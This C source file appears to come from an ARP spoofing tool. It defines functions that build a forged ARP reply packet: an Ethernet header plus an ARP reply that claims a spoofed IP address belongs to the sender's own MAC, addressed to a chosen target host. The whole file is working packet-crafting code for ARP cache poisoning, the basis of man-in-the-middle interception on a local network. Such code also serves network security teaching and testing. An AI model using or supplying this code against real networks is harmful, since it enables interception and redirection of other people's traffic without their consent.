#include <stdio.h>
#include <net/ethernet.h> // ETH_ALEN, ETH_P_ARP, ETHERTHYPE_ARP
#include <string.h> // for memcpy
#include <arpa/inet.h> // for htons
#include "arp_reply.h"
#include "header.h"

static void assign_ethernet_header(char *packet, u_char *own_eth_address, u_char *target_eth_address) {

	struct ethernet_header *header = (struct ethernet_header*) packet;
	memcpy(header->destination, target_eth_address, ETH_ALEN);
	memcpy(header->source, own_eth_address, ETH_ALEN);
	header->type = htons(ETHERTYPE_ARP);
}

static void assign_arp_header(
	char *packet, u_char *spoof_eth_address, u_char *spoof_ip_address, u_char *target_eth_address, u_char *target_ip_address) {

	struct arp_header *header = (struct arp_header*)(packet + sizeof(struct ethernet_header)); 

	header->hardware_type = htons(ARPHDR_ETHER);
	header->protocol_type = htons(ETH_P_IP);
	header->hardware_address_length = ETH_ALEN;
	header->protocol_address_length = IP_ALEN;
	header->opcode = htons(ARPOP_REPLY);
	
	memcpy(header->source_hardware_address, spoof_eth_address, ETH_ALEN);
	memcpy(header->source_protocol_address, spoof_ip_address, IP_ALEN);

	memcpy(header->destination_hardware_address, target_eth_address, ETH_ALEN);
	memcpy(header->destination_protocol_address, target_ip_address, IP_ALEN);
}

int get_arp_reply_size() {
	return sizeof(struct ethernet_header) + sizeof(struct arp_header);
}

u_char *spoofed_arp_reply (
	u_char *own_eth_address, u_char *spoof_ip_address,
	u_char *target_eth_address, u_char *target_ip_destination) {

	static u_char packet[sizeof(struct ethernet_header) + sizeof(struct arp_header)];

	assign_ethernet_header(packet, own_eth_address, target_eth_address);
	assign_arp_header(packet, own_eth_address, spoof_ip_address, target_eth_address, target_ip_destination);

	return packet;
}
